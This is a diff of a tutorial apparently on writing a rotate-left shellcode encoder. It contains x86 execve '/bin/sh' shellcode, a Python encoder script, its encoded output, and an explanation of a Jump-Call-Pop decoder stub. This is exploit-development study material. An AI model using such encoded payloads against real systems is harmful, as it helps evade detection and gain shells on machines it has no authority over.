@@ -60,12 +60,8 @@ Perfect. Now we will need to encode this shellcode using our Python Encoder `rot
 shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
 shellcode += "\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1"
 shellcode += "\xb0\x0b\xcd\x80"
-
 encoded1 = ""
 encoded2 = ""
-
-print 'Encoded shellcode ...'
-
 for x in bytearray(shellcode) :
     if x > 127:
         x = x - 128             # Remove the left-most bit
@@ -80,29 +76,36 @@ for x in bytearray(shellcode) :
         encoded1 += '%02x' %(x << 1)
         encoded2 += '0x'        # No leftmost bit, just rotate
         encoded2 += '%02x,' %(x << 1)
-    
 print encoded1
 print encoded2
 print 'Len: %d' % len(bytearray(shellcode))
 ```
 
-Outputting our new, encoded shellcode:
+#### Outputting Our Encoded Shellcode
 
 ```bash
 root# python rotateLeftEncoder.py
-Encoded shellcode ...
-\x62\x81\xa0\xd0\x5e\x5e\xe6\xd0\xd0\x5e\xc4\xd2\xdc\x13\xc7\xa0\x13\xc5\xa6\x13\xc3\x61\x16\x9b\x01                   
-0x62,0x81,0xa0,0xd0,0x5e,0x5e,0xe6,0xd0,0xd0,0x5e,0xc4,0xd2,0xdc,0x13,0xc7,0xa0,0x13,0xc5,0xa6,0x13,0xc3,0x61,0x16,0x9b,0x01,
+\x62\x81\xa0\xd0\x5e\x5e\xe6\xd0\xd0\x5e\xc4\xd2\xdc
+\x13\xc7\xa0\x13\xc5\xa6\x13\xc3\x61\x16\x9b\x01                   
+
+0x62,0x81,0xa0,0xd0,0x5e,0x5e,0xe6,0xd0,0xd0,0x5e,0xc4,\
+0xd2,0xdc,0x13,0xc7,0xa0,0x13,0xc5,0xa6,0x13,0xc3,0x61,\
+0x16,0x9b,0x01
 Len: 25
 ```
 
-Our encoded shellcode payload is 25 bytes. We will need to add a final byte to the end `\xff`.  
-This byte will be used by our decoder to let it know it has reached the end of our payload.  
++ Our encoded shellcode payload is 25 bytes. 
++ We will need to add a final byte to the end `\xff`.  
+  - This byte will be used by our decoder to let it know it has reached the end of our payload.  
+
 We will copy the second output with the "0x, " format to our nasm program after appending the byte.  
 
-This assembly program will use the Jump-Call-Pop technique to save the memory location of our string to the stack and then pop that address into the ESI Register.   
-Once in the ESI Register, we will decode our encoded shellcode byte by byte using the instructions `ror byte [esi], 1` (rotate to the right one bit, one byte at a time), and `inc esi`. If the decoded byte is `\xff` then we will jump to the shellcode using the instruction `je Shellcode`.   
-If the byte is not `\xff` then the zero flag will not be set, and that jump will be ignored.   
+This assembly program will use the Jump-Call-Pop technique to save the memory location of our string to the stack and then pop that address into the ESI Register.   Once in the ESI Register, we will decode our encoded shellcode byte-by-byte, using the instructions `ror byte [esi], 1` and `inc esi`. 
++ `ror byte [esi], 1` 
+  - rotate to the right one bit, one byte at a time, 
++ If the decoded byte is `\xff` then we will jump to the shellcode using the instruction `je Shellcode`.  
++ If the byte is not `\xff` then the zero flag will not be set, and that jump will be ignored.   
+
 The next instruction `jmp short decode` is an unconditional jump. We use this to create the loop to decode our shellcode.  
 
 ```nasm
